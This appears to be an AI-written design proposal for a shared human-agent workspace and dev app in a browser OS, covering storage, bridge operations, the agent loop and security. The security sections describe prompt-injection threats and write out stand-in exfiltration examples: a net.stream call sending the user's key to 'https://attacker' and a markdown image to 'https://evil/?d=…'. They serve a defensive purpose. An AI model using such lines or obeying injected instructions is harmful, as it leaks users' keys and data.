# Airis OS: Shared Workspace and Bench, design proposal

*Status: proposal, 2026-11-14. Grounded in the repo as it stands: `airis.contract.json`, `shell.js`, `apps/session.html`, `lib/router.js`. No code was written.*

---

## 0. Recommendations in brief

1. **Execution model: local-first hybrid. v1 needs no new server.** Files and the agent loop live in the browser. Execution runs in the place the OS already runs code: sandboxed frames and Web Workers. Real execution (shell, git, npm, native binaries) arrives later through a **runner protocol**, and the first runner is one the user brings, on their own machine. "Bring your own key" becomes "bring your own key and machine." A Cloudflare-hosted sandbox is an option for later. It depends on Paul deciding whether the site ever has accounts.
2. **Reject WebContainers for now.** It needs cross-origin isolation (COOP/COEP) on the top-level page, which conflicts with an OS whose job is framing other content. Commercial production use also needs a licence. And it solves a problem (running Node projects) that v1 doesn't need to solve.
3. **The shell must own the filesystem.** This isn't a choice. App frames have opaque origins, so they cannot open IndexedDB, OPFS or localStorage. Any workspace an agent and a human share has to be a shell service behind the bridge. That is also the right design, because files become addressable objects in the OS rather than a private detail of one app.
4. **The most important shell change isn't the dev environment.** It is letting **apps publish their own state and actions**. Today the action registry (`shell.js:1065`) only covers OS chrome: open, close, focus, theme. The agent can see windows but can't see inside any app. "Agent-friendly" has to mean that every app is addressable through one contract, and Airis's own apps get no special path.
5. **Prefer reversibility over approval gates.** Workspace writes are versioned and can be undone, so they don't need a prompt. Approval is kept for effects that can't be undone: network egress, installing an app, running commands on a runner, anything touching secrets. The shell renders those approvals, never the app.
6. **Cooperation rests on three mechanisms:** compare-and-swap writes, leases (one writer per surface, human input wins, visibly), and a hand-back message generated from the operation log. Nothing depends on the model "being polite."
7. **Fix two security issues before Bench ships.** The agent will be reading untrusted content, and these make that dangerous:
   - **Secrets are not bound to a destination.** `net.stream` attaches an app's secret to *any* https URL the app names. A prompt-injected agent could send the user's key to an attacker in an `Authorization` header. The key never returns to app code, but that doesn't help here.
   - **The shell CSP allows `'unsafe-inline'`.** It must, because code apps run as `srcdoc` and inherit that CSP. That puts key theft one HTML injection away.
8. **First slice: "Bench v0".** A human and an agent build a single-file Airis app together, preview it as a live window, and the agent tests it **through the same publish/act contract** a human-facing app uses. Then it is installed into the dock. No runner, no npm, no git.

---

## 1. What exists, and what it forces

| Fact (from the repo) | What it implies |
|---|---|
| Apps run in `sandbox="allow-scripts …"` frames with no `allow-same-origin` (contract `sandbox`). | Apps have no storage APIs of their own. Every persistent or shared thing has to be a bridge operation. |
| The bridge identifies the caller by `event.source`, not by anything the app claims (`shell.js:1115`). | This is a sound basis for per-app grants. Keep it. |
| One action registry, and every dispatch goes to the trail with its actor (`shell.js:1085`). | This is the core of "shared room." It needs extending into apps, not replacing. |
| App storage is site-origin localStorage, roughly 5 MB, synchronous. | It can't hold workspaces. Workspaces need IndexedDB. |
| The Worker has no bindings and stores nothing. The proxy is a fixed-upstream passthrough. | Any server-side state (cloud runner, durable runs) breaks a stated property. That should be a deliberate decision, not drift. |
| Session already does tool calling against `airis_state` / `airis_do`, capped at 8 rounds (`session.html:240-290`). | A working agent loop exists to build from. It should be factored out, not copied. |
| The bridge uses `{airis:1}` messages, but `house.html` / `todo.html` use untyped `house:*` messages. | Two protocols. Bench and all new work use only the `airis` envelope. |

---

## 2. Execution model

### Options considered

**(a) Client-side sandbox.**
- *WebContainers*: real Node in the tab. It requires `crossOriginIsolated`, which means COOP+COEP on the **top-level** document. A COEP shell can only frame content that opts in with CORP/COEP, or uses `credentialless` iframes, which aren't supported everywhere. That fights the OS's purpose. A dev environment launched standalone in its own isolated origin would work, but it would lose the bridge, and with it the whole point. It is also multi-megabyte and needs a commercial licence for production (check StackBlitz's current terms).
- *Lighter pieces*, each lazy-loaded and cached when first used:
  - QuickJS-wasm, about 1 MB: deterministic JS sandbox
  - esbuild-wasm, about 10 MB: bundling
  - Pyodide, 6 MB or more of core plus packages
  - isomorphic-git, a few hundred KB, but it needs a CORS proxy for any remote
- **What can never run in a tab:** native binaries, real git remotes without a proxy, `npm install` of anything with native addons or postinstall scripts, sockets, and long-running processes after the tab closes.

**(b) Remote runner.** For example, the Cloudflare Sandbox SDK (containers behind Durable Objects). It gives real Linux, git, npm and ports. The costs:
- Workers Paid plus container billing
- the first DO/container bindings, which break "nothing server-side"
- user code living on a server
- cold starts of seconds
- **abuse**: anonymous free compute gets used for mining within days. It needs identity, a quota, or Turnstile plus hard limits. Since the site has no accounts, this decides itself for now.

**(c) Hybrid. Recommended**, with this split:

| Lives in the browser (v1) | Lives on a runner (v2+) |
|---|---|
| The filesystem (source of truth) | A *mirror* of a workspace, synced by version |
| The agent loop, model calls, key | Nothing secret. It gets files and commands, never the LLM key |
| Previewing single-file apps (sandboxed frame) | `bash`, git, npm, test suites, servers |
| JS checks/tests in a killable Web Worker | Anything over about 1 s CPU or needing a socket |

**The first runner is a small local daemon the user runs** (`airis-runner`): it binds 127.0.0.1, pairs with a one-time code, enforces an Origin check, and runs commands inside a container by default. The shell already allows `connect-src http://localhost:*` for LM Studio, so the pattern is established. A cloud runner fits behind the same protocol later.

Tools are offered only for capabilities that exist. With no runner attached, the agent has no `bash` tool. There is no imitation shell, because a fake shell trains the model to expect things that aren't there.

**Why hybrid, opinionated:** the things built here today are single-file HTML apps that run in the OS's own frames. The OS is already the runtime for them. Put the server-side cost where it buys something no browser can provide, and nowhere else.

**Cold start and bundle:** Bench's base is an editor plus diff plus the loop, roughly 300–500 KB. Every wasm tool is loaded on first use and cached in the Cache API. Nothing heavy loads with the shell.

---

## 3. Filesystem and state

### Store: shell-owned, IndexedDB, content-addressed

```
blobs      sha256 → bytes
versions   ws, path, ver → {blob, actor, runId?, callId?, t, parent}
heads      ws, path → ver          (current tree = all heads)
ops        ws, seq → {actor, kind: write|delete|move, path, from, to, callId?}
journals   app, log, seq → event   (generic append-only log, see §4)
```

- **Every write is compare-and-swap (CAS).** `fs.write({ws, path, content, base: ver})` fails with `conflict {current, actor, diff}` if the head moved. Creating a file uses `base: null`.
- **History comes free.** Diffs are blob against blob. Checkpoints are just a recorded `ops.seq`. "Revert the agent's run" means replaying the inverse of the ops tagged with that `runId`.
- **This is git-shaped but not git.** I would not adopt git's object format in v1. Mapping to it later for isomorphic-git export is mechanical. *Unsure:* if Paul wants GitHub push soon, using git objects from the start saves a migration. That is settled by asking whether v2 includes push.
- **IndexedDB, not OPFS, for v1.** Files are small, and IDB transactions give atomic multi-key commits. OPFS earns its place later, for wasm tools that want sync file handles inside a worker (sqlite, Pyodide).

### Persistence and loss, honestly
- Call `navigator.storage.persist()` when the first workspace is created, and show `storage.estimate()` in Bench.
- **Safari is the real risk.** ITP can evict script-writable storage for sites without recent user interaction, and private windows lose everything. The backstop is **export a workspace as a bundle** (extending the existing `airis.bundle/1` with a `workspace` record type), plus a visible "last exported" indicator.
- Clearing site data deletes everything. Say so in the UI rather than in a privacy page.

### Multiple tabs
- Each tab's shell opens the same IDB. Change notifications travel on a `BroadcastChannel('airis.fs')` carrying `{ws, path, ver, actor}`, so open editors in other tabs update live.
- **Only one tab drives a run at a time.** `navigator.locks.request('airis.run:<ws>')` decides which tab executes the agent loop for a workspace. Other tabs follow the journal read-only, and they can **steer** by appending a `steer` event to the journal, which the owning tab picks up at its next step boundary. CAS keeps human edits from two tabs safe regardless.

---

## 4. The shell contract: what *any* app gets

Paul's rule is that the shell never assumes Airis's capabilities. Everything below is generic. Session, Bench, To Do and a third-party app all get the same contract. **The shell contains no agent.** The agent loop is a static library (`/lib/airis-agent.js`) that apps can include if they choose.

### New bridge operations

| Op | Cap | Purpose |
|---|---|---|
| `app.publish` `{state, actions:[{name, args, effect, agent}]}` | none | An app declares its semantic state (JSON, small) and its actions. Re-publish on change; the shell diffs and throttles. |
| `app.selection` `{ref, text?}` | none | What the human has selected in this app, so "fix *this*" has a referent. |
| `app.state` `{id}` / `app.act` `{id, action, args}` | `actions` | Read another app's published state, or invoke its action. The shell routes `app.act` to the target frame as `{airis:1, event:'act', …}` and waits for the reply. |
| `fs.list / read / stat / write / edit / delete / move / diff / history / watch` | `fs` + workspace grant | As in §3. `edit` = exact-string replace with `base`. |
| `log.append / read / watch` | `storage` | Append-only journal in IDB. This is what makes runs survive reload. |
| `consent.request` `{effect, summary, detail, diff?}` | none | **Rendered by the shell**, outside the app frame, so the app can't fake or auto-click it. Returns `granted / denied / edited`. |
| `preview.open` `{ws, entry, grants}` / `preview.close` | `preview` | Opens a temporary sandboxed app window from workspace files. It gets **no** capabilities by default, and console output and errors are forwarded to the opener. |
| `secret.use` `{name}` → grant | `secrets` | Keys belong to the *user* and are bound to an origin at entry time. Apps ask for permission to use them. This replaces per-app copies (today Bench would need the key typed in again). |

**Effect classes** are declared on every action and every tool, and they drive the gating policy:
- `read`
- `write` (reversible, versioned)
- `external` (network, install, runner commands)
- `secret`

A third-party app's actions are gated by exactly the same table as Airis's.

### What "the agent sees the screen" means mechanically

`os.state()` gains, for each open window:
- the app's published `state` (truncated)
- its `actions`
- the human's current `selection`
- **who holds the window's lease** (§6)

For an app that publishes nothing, the agent gets only what exists today: the window, its title, and the fact that it's open.

There is **no pixel or DOM fallback from the shell, and there can't be one**. Opaque-origin frames are unreadable by design. A small opt-in `airis-kit.js` can generate an accessibility-tree-style snapshot *from inside* an app and publish it. Screenshots would need `getDisplayMedia`, which brings a permission prompt each session. Leave them out.

**Symmetry:** when the human clicks a published action in an app, the app reports it, and the trail shows `human` acting in `app:<id>`. The agent sees what the human did through the same channel the human uses to see what the agent did.

---

## 5. Agent loop and tool contract

### The loop: `airis-agent.js`, shared by Session and Bench
OpenAI-compatible streaming `chat/completions` through `net.stream`, as today. Each turn:

1. Compose context: system prompt, workspace summary, run journal, and queued steering messages.
2. Stream. Text deltas render live. **`tool_calls` argument deltas are parsed incrementally**, so an `fs_edit` shows up as a diff *being written* before it is proposed.
3. Validate the arguments against the JSON schema. If invalid, return the validation error to the model as the tool result. Don't guess.
4. Gate by effect class (below), then execute, then journal the result.
5. Before the next model call, check for pause, stop or steer.

Request `stream_options.include_usage` and show tokens for each run. Replace Session's round cap of 8 with a token/step budget that the user can see and raise.

### Tools (Bench v0)

| Tool | Effect | Notes |
|---|---|---|
| `fs_list(path, depth)` | read | |
| `fs_read(path, from?, to?)` | read | Returns `ver`. Long files are returned in line ranges. |
| `fs_search(pattern, glob?)` | read | Plain substring or regex search over the workspace. |
| `fs_write(path, content, base)` | write | For new files and whole rewrites. |
| `fs_edit(path, old, new, base)` | write | The preferred edit. Small tokens, readable diffs, and it fails loudly if `old` isn't unique. |
| `fs_delete / fs_move` | write | Versioned, so reversible. |
| `preview_open(entry)` / `preview_logs()` | read* | *Opening a window is visible but harmless: no grants. |
| `app_state(id)` / `app_act(id, action, args)` | per action | How the agent *tests what it built*. |
| `os_state()` / `os_do(...)` | per action | Existing. |
| `ask_human(question, choices?)` | — | An explicit pause. The run waits. |
| `install_app(entry)` | **external** | Always shell consent. |
| *(v2)* `run(cmd, cwd, timeout)` | **external** | Only when a runner is attached. Streams stdout/stderr. |

### Gating policy (per workspace, visible in the run header)
- **Default:** `read` and `write` run without asking. They are reversible, and every write appears as a diff card with **Revert**. `external` and `secret` always ask through `consent.request`.
- **Careful:** writes also ask, as an approval card with an **editable diff**. The human can change the agent's content before it lands, and the agent is told in the tool result.
- There is no mode where `external` runs without asking in v1.

### Surviving a reload: the run *is* its journal
Events go to `log.append`: `user`, `assistant_delta` (merged every 250 ms), `tool_call`, `tool_start{base versions}`, `approval`, `tool_end{result}`, `steer`, `pause`, `resume`, `interrupted`.

On reload, Bench rebuilds the UI by replaying the journal. Then:
- **A model stream that was in flight is lost.** The upstream is stateless and the Worker stores nothing. Keep the partial text, mark it `interrupted`, and show **Resume**, which re-sends the conversation. **Don't auto-resume:** a reload may have been the human's way of stopping it.
- **A tool started but not finished:** fs writes carry `callId`, so the op log says whether the write landed. That gives effectively exactly-once behaviour for file operations. Previews just reopen. Runner jobs (v2) are reattached by job id.
- **A pending approval is still pending.**
- **Tab closed means the run is paused.** Running agents with the tab closed would need server-side state *and* the key on the server. That isn't proposed.

**Model variability is the biggest unknown in this whole document.** Keys and models are bring-your-own, and tool-calling quality varies a lot between models. Mitigations: strict schema validation, `fs_edit` rather than whole-file rewrites, and short tool results. **What settles it:** a 20-task scripted eval (with fixed workspace fixtures) run against the models available on OpenCode Go, *before* polishing the UI.

---

## 6. Cooperation mechanics

1. **No hidden state.** The human's editor writes through to the FS (debounced about 300 ms, actor `human`). There is no private dirty buffer the agent can't see. Combined with CAS, this makes most conflicts impossible rather than merely detectable.
2. **Conflicts are tool results, not crashes.** If the agent's `fs_edit` has a stale `base`, it gets `conflict: human changed lines 40–52 since you read it` plus the diff. It re-reads and continues. This is in the system prompt, and the eval should check it.
3. **Leases: one writer per surface, the human preempts.**
   - A lease is held per file and per window.
   - Human keyboard or pointer input in a file or window takes its lease immediately.
   - While the human holds a lease, agent writes to that file and `app_act` on that window are refused with `leased by human`. The model is expected to wait, work elsewhere, or `ask_human`.
   - Leases show as coloured presence markers in the file tree, the editor gutter and the window frame.
   - Hand-back is explicit (a **Hand back** button, or `Esc` in the editor). *Open question:* whether idle timeout should also return the lease. My recommendation is no at first, and to try it in use.
4. **Taking the wheel.**
   - **Pause** takes effect at the next boundary: the stream is aborted with `net.abort`, any running tool finishes (they're short), and the run stops.
   - The human edits, runs the preview, whatever they like.
   - **Resume** automatically injects a **hand-back message generated from the op log** between pause and resume: "While paused, human edited `index.html` (+12 −3, diff attached), opened preview, invoked `timer.start`." The agent is never told "the user may have changed things." It is told exactly what changed.
5. **Steering without stopping.** Typing in the composer during a run queues a `steer` event, which is injected at the next tool-call boundary. **Interrupt** (`Ctrl+Enter`) aborts the current stream and injects the message immediately.
6. **Attention is visible.** Whatever the agent is reading or touching has an agent-coloured outline (file in the tree, window frame). The trail line names the run and the call. The human never has to ask what it's doing.
7. **Deictic reference.** `app.selection` and the editor selection go into context, so "make *this* bigger" resolves to something specific.

---

## 7. Bench: the dev environment as an OS app

**A link app at `/apps/bench/`**, not `srcdoc`. It is still sandboxed with an opaque origin and still uses only the bridge. Being a link app lets it be multiple files, load a vendored editor, and carry its own CSP without `'unsafe-inline'`. It is **not preinstalled**: it's in the catalogue, because not everyone needs it.

Manifest capabilities: `fs`, `net`, `secrets` (used through `secret.use`), `actions`, `preview`, `storage`.

**The run is the primary surface. Like pi, but graphical.**
```
┌ run header: model · policy · tokens · [Pause] [Stop] [Revert run] ──────┐
│ timeline: messages, "read index.html", diff cards (live-forming),      │
│           preview console errors, approval cards, hand-back summaries   │
├─────────────────────────────────────────────────────────────────────────┤
│ composer (always live: queues steer while running)                      │
└─────────────────────────────────────────────────────────────────────────┘
  side drawer (collapsible): file tree with presence + editor
```
The editor is secondary. It opens when the human clicks a file, a diff card, or takes the wheel. The preview is **a separate OS window**, not a pane, so it's a real app the agent addresses through `app_state`/`app_act`, the same way it would address any other app.

**Editor:** vendor CodeMirror 6 (a few hundred KB). Avoid a CDN dependency because of CSP. *Unsure:* whether a sandboxed opaque-origin frame resolves `'self'` in its own CSP well enough to load vendored scripts on all three engines. That is settled by a 15-minute test page. The fallback is one prebuilt file. Bench may justify the repo's first tiny build step, scoped to Bench alone.

**Install:** **Install as app** turns the workspace into an install record with `source:'workspace'` and the version taken from the head, through shell consent. Re-installing after more edits bumps the version and restarts the open window, using the existing import semantics.

---

## 8. Security posture

**Keys in the browser.** A bearer token in browser storage is stolen by any script running on the shell origin. WebCrypto can't help, because the plaintext has to go into a header.
- Mitigations: keep the shell origin's script surface minimal. That means no third-party scripts, Trusted Types where supported, and **removing `'unsafe-inline'`**. Code apps currently need it because `srcdoc` inherits the shell CSP. The fix is to run code apps through `/run.html`, which has its own CSP: a sandboxed `src=` frame that receives the code over postMessage.
- Also: a "this session only" key option (memory only), and encourage spend-limited keys.

**Secret reach (fix first).** `secret.set` records the origin the key is for (the preset's base URL). The shell attaches it only to that origin. Today an injected agent in Session could call `net.stream({url:'https://attacker', auth:{secret:'key.…'}})`.

**The Worker proxy.**
- The "stores nothing" claim is true of the code. It is not a cryptographic guarantee: the key passes in plaintext through Cloudflare and the Worker. Say that on the page, publish the Worker source, and point anyone who wants to avoid it at providers that allow direct CORS (OpenRouter).
- The origin check (`router.js:57`) lets requests with **no** Origin header through, so non-browser clients can use it as a relay for their own OpenCode keys. That's low harm (fixed upstream, their own key), but add the Workers rate-limiting binding per IP and require Origin on POST.

**Generated code.**
- Previews run with an opaque origin, **no capabilities by default**, no fs, no secrets.
- A `while(true)` in a same-site sandboxed frame may share the shell's process or thread and freeze the OS. *Unsure:* Chromium's isolation of sandboxed frames and Firefox Fission behave differently here. That is settled by a busy-loop test on Chrome, Firefox and Safari.
- **The robust fix is serving previews from a separate site** (e.g. `jaxah-preview.net`), which forces an out-of-process frame. Tests run in a Web Worker with `terminate()` on timeout.

**The agent with write access.**
- Blast radius: the workspaces granted to Bench. All writes are versioned and can be reverted per run.
- It has no reach into shell storage, secrets, the install DB (except through consent), or other apps' data.
- **Prompt injection, the "lethal trifecta" (private data, untrusted content, an exfiltration channel together):** Bench v0 has **no web-fetch tool**. Untrusted input is limited to imported files and app state.
- Exfiltration channels: `net` (gated), the preview (no net grant by default), and markdown images in the timeline, the classic `![](https://evil/?d=…)`. The shell CSP already restricts `img-src` to `'self' data: blob:`. **Bench's own CSP must match**, and the timeline renders no remote images.

**The local runner (v2).** Any website can try to reach localhost. Requirements:
- pairing token plus Origin check
- bind to 127.0.0.1 only
- container by default
- a visible "runner attached" indicator in the shell

Chrome's Local Network Access prompt adds friction but is acceptable.

---

## 9. First vertical slice: Bench v0

**Shell:**
1. Origin-bound secrets, plus `secret.use` grants.
2. `fs.*` on IndexedDB with CAS, versions, `callId` tagging, BroadcastChannel notifications. One workspace type.
3. `log.*` journal.
4. `app.publish` / `app.state` / `app.act` / `app.selection`. Then make **To Do** publish its state and actions as the first proof that a non-Airis app becomes addressable.
5. `consent.request` rendered by the shell.
6. `preview.open` with console and error forwarding.
7. Leases on files and windows, with presence rendering.

**Library:** factor Session's loop into `/lib/airis-agent.js`: streaming tool-call parsing, schema validation, journal, pause/steer/resume, hand-back generation. Move Session onto it as well, so there is one loop.

**Bench:** timeline, composer, file drawer with CodeMirror, diff cards with Revert, approval cards with editable diffs, run header, export workspace, install as app.

**Acceptance demo (this is the spec):**
1. In an empty workspace, the human asks for "a pomodoro timer app that publishes its state and a `start` action."
2. The agent writes `index.html` and opens the preview.
3. It reads a console error, then fixes it with `fs_edit`.
4. Mid-run, the human changes a colour. The agent's next edit hits a CAS conflict, it re-reads, and it continues.
5. The human reloads the tab. The journal restores the run, and the interrupted stream shows **Resume**.
6. The agent calls `app_act(preview, 'start')` and checks `app_state`.
7. **Install** asks for shell consent, and the app appears in the dock.
8. The trail tells the whole story with actors.

**Deliberately left out of v1:**
- runners and any shell command
- npm, git, multi-file bundling (v0 apps are single-file, as the contract already requires)
- web fetch
- more than one agent run per workspace
- sync across devices
- cloud execution
- Pyodide and other wasm toolchains
- language servers
- idle-timeout lease return
- screenshots or DOM-reading of apps that don't publish
- migrating the untyped `house:*` messages (do it, but not as part of this)

---

## 10. Open questions, and what settles each

| Question | What settles it |
|---|---|
| Can the BYO models on OpenCode Go do reliable multi-step tool use? | A 20-task fixture eval before the UI work. If they can't, the design still holds, but v0 needs stricter tools. |
| Does a busy loop in a same-site sandboxed preview freeze the shell? | A test page on three browsers. If it does, a preview origin on another site moves into v0. |
| Can a sandboxed link app load vendored scripts under its own `'self'` CSP? | A test page. Decides whether Bench gets a build step. |
| How bad is Safari eviction in practice? | Usage over a few weeks. Until then, the export indicator is the backstop. |
| Will the site ever have accounts? | Paul. Yes opens a Cloudflare Sandbox runner and maybe durable runs. No makes the local runner the only real execution. |
| Git objects from the start? | Whether GitHub push is in v2. |

A note on process: your CLAUDE.md routes writing and coding to `pi`. This brief asked me to think and propose, so I wrote this proposal myself and nothing was written to the repo. If you want it saved as `docs/bench-design.md`, or the v0 shell work started, I'll send that through `pi-check`.
